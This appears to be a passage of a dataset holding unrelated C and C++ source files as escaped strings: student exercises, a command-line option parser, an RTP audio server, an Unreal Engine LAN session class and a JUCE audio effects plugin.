  cin.getline(novo.marca,50);\n\n    cout<< \"Digite o Modelo: \";\n    cin.getline(novo.modelo,50);\n\n    cout <<\"Digite a Cidade de Partida: \";\n    cin.getline(novo.cidade_partida,50);\n\n    cout << \"digite a Cidade de Destino: \";\n    cin.getline(novo.cidade_destino,50);\n\n    cout << \"Digite o tipo de combustivel: \";\n    cin.getline(novo.tipo_combustivel,50);\n\n    cout << \"Digite o Tempo Percorrido: \";\n    cin >> novo.tempo_percorrido;\n\n    cout << \"Digite a Distancia Percorrida: \";\n    cin >> novo.distancia;\n\n    cout << \"Digite a quantidade de combustivel consumido: \";\n    cin >> novo.combustivel_consumido;\n\n    novo.consumo_km = novo.distancia/novo.combustivel_consumido;\n\n\n\n\n\n    return novo;\n}\n\nvoid limpar_tela() {\n    #ifdef _WIN32\n        system(\"cls\");   // Comando para limpar a tela no Windows\n    #else\n        system(\"clear\"); // Comando para limpar a tela no Linux ou macOS\n    #endif\n}\n\nint menu(){\n    int opcao;\n    cout << \"escolha uma op\u00e7ao:\\n1.Cadastro\\n2.Consultar\\n3.Deletar\\n4.Listar Dados\\n5-Sair\" << endl;\n    cout << \"Digita a op\u00e7\u00e3o: \";\n    cin >> opcao;\n    cin.ignore();\n    limpar_tela();\n    return opcao;\n}\nvoid listar_dados(Descritor* descritor, int opcao2){\n    Elem *aux;\n    int i = 1;\n    if (opcao2 == 0){\n        aux =descritor->inicio;\n    }\n    else\n    {\n        aux = descritor->final;\n    }\n    while(aux!= NULL){\n        cout << \"Cadastro \" << i <<endl;\n        imprimir_dados(aux);\n        if (opcao2 == 0){\n        aux = aux -> prox;\n        ",
    "#include <assert.h>\n#include \"cargs.h\"\n#include <memory.h>\n#include <stdio.h>\n#include <string.h>\n\nstatic void cag_option_print_value(const cag_option *option,\n  int *accessor_length, FILE *destination)\n{\n  if (option->value_name != NULL) {\n    *accessor_length += fprintf(destination, \"=%s\", option->value_name);\n  }\n}\n\nstatic void cag_option_print_letters(const cag_option *option, bool *first,\n  int *accessor_length, FILE *destination)\n{\n  const char *access_letter;\n  access_letter = option->access_letters;\n  if (access_letter != NULL) {\n    while (*access_letter) {\n      if (*first) {\n        *accessor_length += fprintf(destination, \"-%c\", *access_letter);\n        *first = false;\n      } else {\n        *accessor_length += fprintf(destination, \", -%c\", *access_letter);\n      }\n      ++access_letter;\n    }\n  }\n}\n\nstatic void cag_option_print_name(const cag_option *option, bool *first,\n  int *accessor_length, FILE *destination)\n{\n  if (option->access_name != NULL) {\n    if (*first) {\n      *accessor_length += fprintf(destination, \"--%s\", option->access_name);\n    } else {\n      *accessor_length += fprintf(destination, \", --%s\", option->access_name);\n    }\n  }\n}\n\nvoid cag_option_print(const cag_option *options, size_t option_count,\n  FILE *destination)\n{\n  size_t option_index;\n  const cag_option *option;\n  bool first;\n  int i, accessor_length;\n\n  for (option_index = 0; option_index < option_count; ++option_index) {\n    option = &options[option_index];\n    accessor_length = 0;\n    first = true;\n\n    fputs(\"  \", destination);\n\n    cag_option_print_letters(option, &first, &accessor_length, destination);\n    cag_option_print_name(option, &first, &accessor_length, destination);\n    cag_option_print_value(option, &accessor_length, destination);\n\n    for (i = accessor_length; i < 20; ++i) {\n      fputs(\" \", destination);\n    }\n\n    fputs(\" \", destination);\n    fputs(option->description, destination);\n\n    fprintf(destination, \"\\n\");\n  }\n}\n\nvoid cag_option_prepare(cag_option_context *context, const cag_option *options,\n  size_t option_count, int argc, char **argv)\n{\n  // This just initialized the values to the beginning of all the arguments.\n  context->options = options;\n  context->option_count = option_count;\n  context->argc = argc;\n  context->argv = argv;\n  context->index = 1;\n  context->inner_index = 0;\n  context->forced_end = false;\n}\n\nstatic const cag_option *cag_option_find_by_name(cag_option_context *context,\n  char *name, size_t name_size)\n{\n  const cag_option *option;\n  size_t i;\n\n  // We loop over all the available options and stop as soon as we have found\n  // one. We don't use any hash map table, since there won't be that many\n  // arguments anyway.\n  for (i = 0; i < context->option_count; ++i) {\n    option = &context->options[i];\n\n    // The option might not have an item name, we can just skip those.\n    if (option->access_name == NULL) {\n      continue;\n    }\n\n    // Try to compare the name of the access name. We can use the name_size or\n    // this comparison, since we are guaranteed to have null-terminated access\n    // names.\n    if (strncmp(option->access_name, name, name_size) == 0) {\n      return option;\n    }\n  }\n\n  return NULL;\n}\n\nstatic const cag_option *cag_option_find_by_letter(cag_option_context *context,\n  char letter)\n{\n  const cag_option *option;\n  size_t i;\n\n  // We loop over all the available options and stop as soon as we have found\n  // one. We don't use any look up table, since there won't be that many\n  // arguments anyway.\n  for (i = 0; i < context->option_count; ++i) {\n    option = &context->options[i];\n\n    // If this option doesn't have any access letters we will skip them.\n    if (option->access_letters == NULL) {\n      continue;\n    }\n\n    // Verify whether this option has the access letter in it's access letter\n    // string. If it does, then this is our option.\n    if (strchr(option->access_letters, letter) != NULL) {\n      return option;\n    }\n  }\n\n  return NULL;\n}\n\nstatic void cag_option_parse_value(cag_option_context *context,\n  const cag_option *option, char **c)\n{\n  // And now let's check whether this option is supposed to have a value, which\n  // is the case if there is a value name set. The value can be either submitted\n  // with a '=' sign or a space, which means we would have to jump over to the\n  // next argv index. This is somewhat ugly, but we do it to behave the same as\n  // the other option parsers.\n  if (option->value_name != NULL) {\n    if (**c == '=') {\n      context->value = ++(*c);\n    } else {\n      // If the next index is larger or equal to the argument count, then the\n      // parameter for this option is missing. The user will know about this,\n      // since the value pointer of the context will be NULL because we don't\n      // set it here in that case.\n      if (context->argc > context->index + 1) {\n        // We consider this argv to be the value, no matter what the contents\n        // are.\n        ++context->index;\n        *c = context->argv[context",
    "#include \"RtpServerManager.h\"\n#include \"AudioFileWriter.h\"\n#include \"Utils.h\"\n#include <cstring>\n#include <thread>\n\nRtpServerManager::RtpServerManager(boost::asio::io_context &io_ctx) : m_serverCreationTime(std::chrono::steady_clock::now()),\n                                                                      m_io_ctx(io_ctx), m_flushTimer(io_ctx, std::chrono::seconds(DURATION))\n{\n    startFlushTimer();\n}\n\nvoid RtpServerManager::addClient(uint32_t ssrc, rtpClientInfo &client)\n{\n    auto [it, inserted] = m_rtpSessions.emplace(ssrc, client);\n    if (!inserted)\n    {\n        it->second.sequenceNumber = client.sequenceNumber;\n        it->second.timestamp = client.timestamp;\n    }\n    else\n    {\n        it->second.joinedTime = std::chrono::duration_cast<std::chrono::milliseconds>(\n            std::chrono::steady_clock::now() - m_serverCreationTime);\n    }\n}\n\nvoid RtpServerManager::removeClient(uint32_t ssrc)\n{\n    m_rtpSessions.erase(ssrc);\n}\n\nvoid RtpServerManager::manageBuffer(uint32_t ssrc, const uint8_t *data, size_t length)\n{\n    auto it = m_rtpSessions.find(ssrc);\n    if (it == m_rtpSessions.end())\n    {\n        std::cout << \"Client not found\" << \"\\n\";\n        return;\n    }\n    rtpClientInfo client = it->second;\n\n    // Ensure length is in float samples, not bytes\n    size_t floatSamplesLength = length / sizeof(float);\n\n    // Calculate the index based on joined time and timestamp\n    size_t index = ((client.joinedTime.count() * SAMPLE_RATE / 1000) + client.timestamp) % (MAX_BUFFER_SIZE / sizeof(int16_t));\n\n    std::cout << \"Joined Time (seconds): \" << client.joinedTime.count() / 1000 << std::endl;\n    std::cout << \"Calculated Index: \" << index << std::endl;\n\n    // Allocate a temporary buffer to hold the converted PCM samples\n    std::vector<int16_t> pcmBuffer(floatSamplesLength);\n\n    // Convert float audio samples to 16-bit PCM\n    convertFloatToPCM(reinterpret_cast<const float *>(data), pcmBuffer.data(), floatSamplesLength);\n\n    // Calculate the size of the PCM data in bytes\n    size_t pcmDataSize = pcmBuffer.size() * sizeof(int16_t);\n\n    // Check if the index fits within the buffer size\n    if (index + pcmDataSize <= MAX_BUFFER_SIZE / sizeof(int16_t))\n    {\n        // Copy the PCM data to the buffer\n        // std::memcpy(m_audioBuffer + index, pcmBuffer.data(), pcmDataSize);\n        mergeAudioData(m_audioBuffer, index, pcmBuffer, pcmBuffer.size(), MAX_BUFFER_SIZE);\n        return;\n    }\n}\n\nvoid RtpServerManager::startFlushTimer()\n{\n    // Flush buffer in DURATION seconds interval\n    m_flushTimer.async_wait([this](const boost::system::error_code &ec)\n                            {\n            if (!ec) {\n                m_serverCreationTime = std::chrono::steady_clock::now();\n                flushBufferToDisk();\n                m_flushTimer.expires_at(m_flushTimer.expiry() + std::chrono::seconds(DURATION));\n                startFlushTimer();\n            } });\n}\n\nvoid RtpServerManager::flushBufferToDisk()\n{\n    // Create a copy of the current buffer for saving to file\n    int16_t audioBufferCopy[MAX_BUFFER_SIZE];\n    std::memcpy(audioBufferCopy, m_audioBuffer, MAX_BUFFER_SIZE);\n    std::memset(m_audioBuffer, 0, MAX_BUFFER_SIZE);\n\n    // Start a new thread to save the buffer to a WAV file\n    AudioFileWriter fileWriter{};\n    std::string filename = \"audio_output_\" + std::to_string(m_fileCount++) + \".wav\";\n    fileWriter.saveToWav(filename, audioBufferCopy, MAX_BUFFER_SIZE, 16, SAMPLE_RATE, CHANNELS);\n}\n\nRtpServerManager::~RtpServerManager()\n{\n    // Merge all audio output files upon destruction\n    AudioFileWriter fileWriter{};\n    fileWriter.mergeWavFiles(\"audio_otuput.wav\", \"audio_output_\", m_fileCount);\n}",
    "// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"ProjectRenoGameInstance.h\"\n#include \"Kismet/GameplayStatics.h\"\n#include \"Engine/World.h\"\n\nUProjectRenoGameInstance::UProjectRenoGameInstance()\n{\n}\n\nvoid UProjectRenoGameInstance::Init()\n{\n    Super::Init();\n\n    if (IOnlineSubsystem* Subsystem = IOnlineSubsystem::Get())\n    {\n        SessionInterface = Subsystem->GetSessionInterface();\n        if (SessionInterface.IsValid())\n        {\n            SessionInterface->OnCreateSessionCompleteDelegates.AddUObject(this, &UProjectRenoGameInstance::OnCreateSessionComplete);\n            SessionInterface->OnFindSessionsCompleteDelegates.AddUObject(this, &UProjectRenoGameInstance::OnFindSessionComplete);\n            SessionInterface->OnJoinSessionCompleteDelegates.AddUObject(this, &UProjectRenoGameInstance::OnJoinSessionComplete);\n        }\n    }\n}\n\nvoid UProjectRenoGameInstance::OnCreateSessionComplete(FName SessionName, bool Succeeded)\n{\n    if (Succeeded)\n    {\n        // Start server travel to the specified map\n        GetWorld()->ServerTravel(\"/Game/Scenes/Cam?listen\");\n    }\n    else\n    {\n        UE_LOG(LogTemp, Error, TEXT(\"Failed to create session: %s\"), *SessionName.ToString());\n    }\n}\n\nvoid UProjectRenoGameInstance::OnFindSessionComplete(bool Succeeded)\n{\n    if (Succeeded && SessionSearch.IsValid() && SessionSearch->SearchResults.Num() > 0)\n    {\n        for (const auto& Result : SessionSearch->SearchResults)\n        {\n            FString FoundSessionName;\n            if (Result.Session.SessionSettings.Settings.Contains(FName(\"SESSION_NAME\")))\n            {\n                Result.Session.SessionSettings.Settings[FName(\"SESSION_NAME\")].Data.GetValue(FoundSessionName);\n                UE_LOG(LogTemp, Warning, TEXT(\"Found Session: %s\"), *FoundSessionName);\n\n                if (FoundSessionName == DesiredSessionName)\n                {\n                    SessionInterface->JoinSession(0, FName(*DesiredSessionName), Result);\n                    return;\n                }\n            }\n        }\n    }\n    else\n    {\n        UE_LOG(LogTemp, Error, TEXT(\"Failed to find sessions or no sessions found.\"));\n    }\n}\n\nvoid UProjectRenoGameInstance::OnJoinSessionComplete(FName SessionName, EOnJoinSessionCompleteResult::Type Result)\n{\n    if (APlayerController* PController = UGameplayStatics::GetPlayerController(GetWorld(), 0))\n    {\n        FString JoinAddress;\n        if (SessionInterface->GetResolvedConnectString(SessionName, JoinAddress))\n        {\n            PController->ClientTravel(JoinAddress, ETravelType::TRAVEL_Absolute);\n        }\n        else\n        {\n            UE_LOG(LogTemp, Error, TEXT(\"Failed to get resolved connect string for session: %s\"), *SessionName.ToString());\n        }\n    }\n}\n\nvoid UProjectRenoGameInstance::CreateServer(const FString& SessionName)\n{\n    UE_LOG(LogTemp, Warning, TEXT(\"Creating server with session name: %s\"), *SessionName);\n\n    FOnlineSessionSettings SessionSettings;\n    SessionSettings.bAllowJoinInProgress = true;\n    SessionSettings.bIsDedicated = false;\n    SessionSettings.bIsLANMatch = true; // Ensure LAN match\n    SessionSettings.bShouldAdvertise = true;\n    SessionSettings.bUsesPresence = false;\n    SessionSettings.NumPublicConnections = 5;\n\n    SessionSettings.Set(FName(\"SESSION_NAME\"), SessionName, EOnlineDataAdvertisementType::ViaOnlineServiceAndPing);\n\n    SessionInterface->CreateSession(0, FName(*SessionName), SessionSettings);\n}\n\nvoid UProjectRenoGameInstance::JoinServer(const FString& SessionName)\n{\n    DesiredSessionName = SessionName;\n\n    SessionSearch = MakeShareable(new FOnlineSessionSearch());\n    SessionSearch->bIsLanQuery = true; // Ensure LAN search\n    SessionSearch->MaxSearchResults = 100;\n    SessionSearch->QuerySettings.Set(SEARCH_PRESENCE, true, EOnlineComparisonOp::Equals);\n\n    SessionInterface->FindSessions(0, SessionSearch.ToSharedRef());\n}\n\n\n",
    "#include <JuceHeader.h>\n\nclass AudioEffectsProcessor : public juce::AudioProcessor\n{\npublic:\n    AudioEffectsProcessor()\n        : parameters(*this, nullptr, \"Parameters\",\n            {\n                std::make_unique<juce::AudioParameterFloat>(\"delayTime\", \"Delay Time\", 0.01f, 1.0f, 0.5f),\n                std::make_unique<juce::AudioParameterFloat>(\"feedback\", \"Feedback\", 0.0f, 0.95f, 0.5f),\n                std::make_unique<juce::AudioParameterFloat>(\"roomSize\", \"Room Size\", 0.0f, 1.0f, 0.8f),\n                std::make_unique<juce::AudioParameterFloat>(\"threshold\", \"Noise Gate Threshold\", 0.0f, 1.0f, 0.1f)\n            })\n    {\n        delayBuffer.setSize(2, 44100); // 1 second buffer at 44100 Hz\n    }\n\n    void prepareToPlay(double sampleRate, int samplesPerBlock) override\n    {\n        this->sampleRate = sampleRate;\n        delayBuffer.clear();\n        reverb.setSampleRate(sampleRate);\n    }\n\n    void releaseResources() override {}\n\n    void processBlock(juce::AudioBuffer<float>& buffer, juce::MidiBuffer&) override\n    {\n        processEcho(buffer);\n        processReverb(buffer);\n        processNoiseGate(buffer);\n    }\n\n    juce::AudioProcessorEditor* createEditor() override { return new juce::GenericAudioProcessorEditor(*this); }\n    bool hasEditor() const override { return true; }\n\n    const juce::String getName() const override { return \"Audio Effects Plugin\"; }\n    bool acceptsMidi() const override { return false; }\n    bool producesMidi() const override { return false; }\n    double getTailLengthSeconds() const override { return 0.0; }\n\n    int getNumPrograms() override { return 1; }\n    int getCurrentProgram() override { return 0; }\n    void setCurrentProgram(int) override {}\n    const juce::String getProgramName(int) override { return {}; }\n    void changeProgramName(int, const juce::String&) override {}\n\n    void getStateInformation(juce::MemoryBlock& destData) override\n    {\n        juce::MemoryOutputStream(destData, true).writeFloat(*parameters.getRawParameterValue(\"delayTime\"));\n    }\n\n    void setStateInformation(const void* data, int sizeInBytes) override\n    {\n        juce::MemoryInputStream stream(data, static_cast<size_t> (sizeInBytes), false);\n        *parameters.getRawParameterValue(\"delayTime\") = stream.readFloat();\n    }\n\nprivate:\n    juce::AudioProcessorValueTreeState parameters;\n    juce::AudioBuffer<float> delayBuffer;\n    int delayIndex = 0;\n    double sampleRate = 44100.0;\n\n    juce::Reverb reverb;\n\n    void processEcho(juce::AudioBuffer<float>& buffer)\n    {\n        auto delayTime = parameters.getRawParameterValue(\"delayTime\")->load();\n        auto feedback = parameters.getRawParameterValue(\"feedback\")->load();\n        const int delaySamples = static_cast<int>(sampleRate * delayTime);\n        auto numSamples = buffer.getNumSamples();\n        auto numChannels = buffer.getNumChannels();\n\n        for (int channel = 0; channel < numChannels; ++channel)\n        {\n            auto* channelData = buffer.getWritePointer(channel);\n            auto* delayData = delayBuffer.getWritePointer(jmin(channel, delayBuffer.getNumChannels() - 1));\n\n            for (int i = 0; i < numSamples; ++i)\n            {\n                float in = channelData[i];\n                float delayedSample = delayData[delayIndex];\n                channelData[i] += delayedSample * feedback;\n                delayData[delayIndex] = in + delayedSample * feedback;\n\n                delayIndex = (delayIndex + 1) % delayBuffer.getNumSamples();\n            }\n        }\n    }\n\n    void processReverb(juce::AudioBuffer<float>& buffer)\n    {\n        juce::Reverb::Parameters reverbParams;\n        reverbParams.roomSize = parameters.getRawParameterValue(\"roomSize\")->load();\n        reverbParams.damping = 0.5f;\n        reverbParams.wetLevel = 0.3f;\n        reverb.setParameters(reverbParams);\n\n        reverb.processStereo(buffer.getWritePointer(0), buffer.getWritePointer(1), buffer.getNumSamples());\n    }\n\n    void processNoiseGate(juce::AudioBuffer<float>& buffer)\n    {\n        const float threshold = parameters.getRawParameterValue(\"threshold\")->load();\n        for (int channel = 0; channel < buffer.getNumChannels(); ++channel)\n        {\n            float* channelData = buffer.getWritePointer(channel);\n            for (int i = 0; i < buffer.getNumSamples(); ++i)\n            {\n                if (std::abs(channelData[i]) < threshold)\n                {\n                    channelData[i] = 0.0f;\n                }\n            }\n        }\n    }\n\n    JUCE_DECLARE_NON_COPYABLE_WITH_LEAK_DETECTOR(AudioEffectsProcessor)\n};\n\n//==============================================================================\nclass AudioEffectsProcessorPlugin : public juce::AudioProcessor\n{\npublic:\n    static juce::AudioProcessor* JUCE_CALLTYPE createPluginFilter()\n    {\n        return new AudioEffectsProcessor();\n    }\n};\n",
    "// using namespace std\n\n// By adding using namespace std; at the beginning of your program, you're telling the compiler that you want to use all the names from the std namespace without explicitly specifying std:: each time. This can make your code cleaner and more concise.\n\n\n\n// #include<iostream>\n// #include<math.h>\n// using namespace std;\n// int main(){\n//     cout <<\"Hello World!\";\n//     cout << \"\\n\";\n//     cout << \"This is a C++ program!\";\n//     cout << \"\\n\";\n//     cout << \"Today's date is \" << __DATE__ << \" and time is \" << __TIME__;\n// cout <<\"hey ayush how is it going \";\n// return 0;\n// }\n\n// As you can see, the newline character \\n inserts a line break, but the second \"Hey, Striver!\" is still on the same line as the first one.\n// You can also use std::endl to insert a newline character and flush the output buffer. Here's the code and its corresponding terminal output:\n\n// Taking User Input using cin\n\n// #include<iostream>\n// using namespace std;\n// int main()\n// {\n//     int x;\n//     cin>>x;\n//     cout<<\"The entered number is: \"<<x;\n//     return 0;\n// }\n\n\n#include<iostream>\nusing namespace std;\n\n// int main() {\n//     int x;\n//     int y;\n//     cin >> x >> y;\n//     cout << \"Value of x : \" << x << \" and y : \" <<y;\n//     return 0;\n// }\n\n\n// #include<bits/stdc++.h>.\n// The bits/stdc++.h header is a shortcut that includes a vast number of standard C++ libraries, making it easier to access a wide range of functions and classes without specifying each library individually. It's a time-saving approach for programmers, especially when you need several standard libraries in your code.\n#include <bits/stdc++.h>\nusing namespace std;\n\nvoid pattern1(int N)\n{\n    // This is the outer loop which will loop for the rows.\n    for (int i = 0; i < N; i++)\n    {\n        // This is the inner loop which here, loops for the columns\n        // as we have to print a rectangular pattern.\n        for (int j = 0; j < N; j++)\n        {\n            cout << \"* \";\n        }\n       \n        // As soon as N stars are printed, we move to the\n        // next row and give a line break otherwise all stars\n        // would get printed in 1 line.\n        cout << endl;\n    }\n}\n\nint main()\n{   \n    // Here, we have taken the value of N as 5.\n    // We can also take input from the user.\n    // int N = 5;\n\n    // pattern1(N);\n\n    // return 0;\n}",
    "#include \"Contact.hpp\"\n\n// Default constructor\nContact::Contact() {}\n\n// Copy constructor\nContact::Contact(const Contact& other) {\n    firstName = other.firstName;\n    lastName = other.lastName;\n    nickname = other.nickname;\n    phoneNumber = other.phoneNumber;\n    darkestSecret = other.darkestSecret;\n}\n\n// Assignment operator\nContact& Contact::operator=(const Contact& other) {\n    if (this != &other) {\n        firstName = other.firstName;\n        lastName = other.lastName;\n        nickname = other.nickname;\n        phoneNumber = other.phoneNumber;\n        darkestSecret = other.darkestSecret;\n    }\n    return *this;\n}\n\n// Destructor\nContact::~Contact() {}\n\n// Setters\nvoid Contact::setFirstName(const std::string& name) {\n    firstName = name;\n}\nvoid Contact::setLastName(const std::string& name) {\n    lastName = name;\n}\nvoid Contact::setNickname(const std::string& name) {\n    nickname = name;\n}\nvoid Contact::setPhoneNumber(const std::string& number) {\n    phoneNumber = number;\n}\nvoid Contact::setDarkestSecret(const std::string& secret) {\n    darkestSecret = secret;\n}\n\n// Getters\nstd::string Contact::getFirstName() const {\n    return firstName;\n}\nstd::string Contact::getLastName() const {\n    return lastName;\n}\nstd::string Contact::getNickname() const {\n    return nickname;\n}\nstd::string Contact::getPhoneNumber() const {\n    return phoneNumber;\n}\nstd::string Contact::getDarkestSecret() const {\n    return darkestSecret;\n}\n\n// Check if contact is empty\nbool Contact::isEmpty() const {\n    return firstName.empty() || lastName.empty() || nickname.empty() ||\n           phoneNumber.empty() || darkestSecret.empty();\n}",
    "#include <windows.h>\n#include <iostream>\n#include <vector>\nusing namespace std;\n\nvolatile int* A = nullptr;\nint arraySize, threadToCloseInThread;\nHANDLE Ready, ReportOfClose, Again;\nHANDLE* CantWork, Threads;\nHANDLE StopWork;\nvolatile int countOfCant = 0; //\u00cf\u00e5\u00f0\u00e5\u00ec\u00e5\u00ed\u00ed\u00e0\u00ff \u00f1\u00f7\u00e5\u00f2\u00f7\u00e8\u00ea \u00ef\u00ee\u00f2\u00ee\u00ea\u00ee\u00e2, \u00ea\u00ee\u00f2\u00ee\u00f0\u00fb\u00e5 \u00ef\u00ee\u00e4\u00e0\u00eb\u00e8 \u00f1\u00e8\u00e3\u00ed\u00e0\u00eb \u00ee \u00e6\u00e5\u00eb\u00e0\u00ed\u00e8\u00e8 \u00e7\u00e0\u00e2\u00e5\u00f0\u00f8\u00e8\u00f2\u00fc\nCRITICAL_SECTION cs;  // \u00ca\u00f0\u00e8\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00e0\u00ff \u00f1\u00e5\u00ea\u00f6\u00e8\u00ff\n\nDWORD WINAPI marker(LPVOID param) {\n    WaitForSingleObject(Ready, INFINITE);\n    int index = (int)param;\n    int count = 0;\n    srand(index + 1);\n    int funny = 5;\n\n    while (true) {\n        int randNumber = rand() % arraySize;\n        EnterCriticalSection(&cs);\n\n        if (A[randNumber] == 0) {\n            Sleep(5);\n            A[randNumber] = index + 1;\n            count++;\n            Sleep(5);\n            LeaveCriticalSection(&cs);\n\n        }\n        else {\n            printf(\"Thread number %d marked %d elements and stopped on %d.\\n\", index+1,count,randNumber+1);\n            count = 0;\n            LeaveCriticalSection(&cs);\n            SetEvent(CantWork[index]);\n            WaitForSingleObject(StopWork, INFINITE);\n\n            if (threadToCloseInThread == index + 1) {\n                for (int i = 0; i < arraySize; i++) {\n                    if (A[i] == index + 1) {\n                        A[i] = 0;\n                    }\n                }\n                ResetEvent(StopWork);\n                goto finish;\n            }\n            else {\n                ResetEvent(CantWork[index]);\n                WaitForSingleObject(Again, INFINITE);\n            }\n        }\n        funny += 20;\n    }\nfinish:\n    return 0;\n}\n\nint main() {\n    InitializeCriticalSection(&cs);  // \u00c8\u00ed\u00e8\u00f6\u00e8\u00e0\u00eb\u00e8\u00e7\u00e0\u00f6\u00e8\u00ff \u00ea\u00f0\u00e8\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e9 \u00f1\u00e5\u00ea\u00f6\u00e8\u00e8\n    cout << \"Enter array size: \";\n    cin >> arraySize;\n    A = new int[arraySize];\n    for (int i = 0; i < arraySize; i++) {\n        A[i] = 0;\n    }\n\n    int numOfThreads;\n    cout << \"Enter number of threads: \";\n    cin >> numOfThreads;\n\n    HANDLE* Threads = new HANDLE[numOfThreads];\n    CantWork = new HANDLE[numOfThreads];\n    Again = CreateEvent(NULL, TRUE, FALSE, NULL);\n    ReportOfClose = CreateEvent(NULL, TRUE, FALSE, NULL);\n    Ready = CreateEvent(NULL, TRUE, FALSE, NULL);\n    StopWork = CreateEvent(NULL, TRUE, FALSE, NULL);  // \u00d1\u00ee\u00e1\u00fb\u00f2\u00e8\u00e5 \u00e4\u00eb\u00ff \u00ee\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00ea\u00e8 \u00ef\u00ee\u00f2\u00ee\u00ea\u00ee\u00e2\n\n    int* threadToEnd = new int[numOfThreads];  // \u00cd\u00ee\u00ec\u00e5\u00f0\u00e0 \u00e7\u00e0\u00e2\u00e5\u00f0\u00f8\u00e5\u00ed\u00ed\u00fb\u00f5 \u00ef\u00ee\u00f2\u00ee\u00ea\u00ee\u00e2\n    for (int i = 0; i < numOfThreads; i++) {\n        threadToEnd[i] = 0;\n    }\n\n    for (int i = 0; i < numOfThreads; i++) {\n        Threads[i] = CreateThread(NULL, 0, marker, (void*)(i), 0, NULL);\n        CantWork[i] = CreateEvent(NULL, TRUE, FALSE, NULL);  // \u00d1\u00ee\u00e1\u00fb\u00f2\u00e8\u00e5, \u00ea\u00ee\u00f2\u00ee\u00f0\u00ee\u00e5 \u00ef\u00ee\u00e4\u00e0\u00e5\u00f2 \u00ef\u00ee\u00f2\u00ee\u00ea\n    }\n\n    SetEvent(Ready);\n\n    int workingThreads = numOfThreads;\n    int countOfFinished = 0;\n\n    while (countOfCant < numOfThreads) {\n        WaitForMultipleObjects(workingThreads, CantWork, TRUE, INFINITE);\n\n        EnterCriticalSection(&cs);\n        cout << endl << \"Array: \";\n        for (int i = 0; i < arraySize; i++) {\n            cout << A[i] << \" \";\n        }\n        cout << endl << \"Ended threads: \";\n        for (int i = 0; i < countOfFinished; i++) {\n            cout << threadToEnd[i] << \" \";\n        }\n        if (countOfFinished == 0) cout << \" NO.\";\n        cout << endl << \"Enter number of thread to end: \";\n\n        cin >> threadToEnd[countOfFinished];\n        LeaveCriticalSection(&cs);\n\n        threadToCloseInThread = threadToEnd[countOfFinished];\n        SetEvent(StopWork);\n\n        WaitForSingleObject(Threads[threadToCloseInThread - 1], INFINITE);\n        EnterCriticalSection(&cs);\n        cout << \"Array: \";\n        for (int i = 0; i < arraySize; i++) {\n            cout << A[i] << \" \";\n        }\n        cout << endl;\n        LeaveCriticalSection(&cs);\n\n        countOfCant++;\n        workingThreads--;\n        countOfFinished++;\n\n        PulseEvent(Again);\n    }\n\n    for (int i = 0; i < numOfThreads; i++) {\n        CloseHandle(CantWork[i]);\n        CloseHandle(Threads[i]);\n    }\n    CloseHandle(Again);\n    CloseHandle(ReportOfClose);\n    CloseHandle(Ready);\n    CloseHandle(StopWork);\n    DeleteCriticalSection(&cs);  // \u00d3\u00e4\u00e0\u00eb\u00e5\u00ed\u00e8\u00e5 \u00ea\u00f0\u00e8\u00f2\u00e8\u00f7\u00e5\u00f1\u00ea\u00ee\u00e9 \u00f1\u00e5\u00ea\u00f6\u00e8\u00e8\n    delete[] A;\n    delete[] Threads;\n\n    return 0;\n}\n",
    "#include <iostream>\r\n#include <cmath>\r\n#include <iomanip>\r\n#include <string>\r\n#include <algorithm>\r\n#include <numeric>\r\n#include <list>\r\n#include \"read.hpp\"\r\n#include \"change.hpp\"\r\n#include <fstream>\r\n#include <sstream>\r\n\r\nusing namespace std;\r\nusing namespace test;\r\n\r\nvoid lab1()\r\n{\r\n    int num1; // -21474836417 - 2147483647, 32 bit\r\n    int num2;\r\n    char num3; // 0-255, 8 bit\r\n    char num4;\r\n    string num5; //2^67\r\n    string num6;\r\n    bool num7; //0-1, 1\r\n    bool num8;\r\n    double num9; // 15 \u00f6\u00e8\u00f4\u00f0, 64 bit\r\n    double num10;\r\n    float num11; // 7 \u00f6\u00e8\u00f4\u00f0, 32 bit\r\n    float num12;\r\n    unsigned int num13; // 0-4294967295, 32 bit\r\n    unsigned int num14;\r\n    short num15; //-32768 - 32767, 16 bit\r\n    short num16;\r\n    long long num17; // -9223372036854775807 - 9223372036854775807, 64 bit\r\n    long long num18;\r\n    cout<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f6\u00e5\u00eb\u00ee\u00f7\u00e8\u00f1\u00eb\u00e5\u00ed\u00ed\u00fb\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num1>>num2;\r\n    cout<< \"num1*num2 = \";\r\n    cout<<num1*num2;\r\n    cout<<endl<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f1\u00e8\u00ec\u00e2\u00ee\u00eb\u00fc\u00ed\u00fb\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num3>>num4;\r\n    cout<< \"num3+num4 = \";\r\n    cout<<num3+num4;\r\n    cout<<endl<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 \u00f1\u00f2\u00f0\u00ee\u00ea\u00ee\u00e2\u00fb\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num5>>num6;\r\n    cout<< \"num5+num6 = \";\r\n    cout<<num5+num6;\r\n    cout<<endl<<\"\u00cb\u00ee\u00e3\u00e8\u00f7\u00e5\u00f1\u00ea\u00e8\u00e5 \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num7>>num8;\r\n    cout<< \"num7+num8 = \";\r\n    cout<<num7+num8;\r\n    cout<<endl<<\"\u00c2\u00e2\u00e5\u00e4\u00e8\u00f2\u00e5 double \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff \u00e7\u00ed\u00e0\u00f7\u00e5\u00ed\u00e8\u00ff: \";\r\n    cin>>num9>>num10;\r\n    cout<<\"num9/num10 = \"<<num9/num10;\r\n    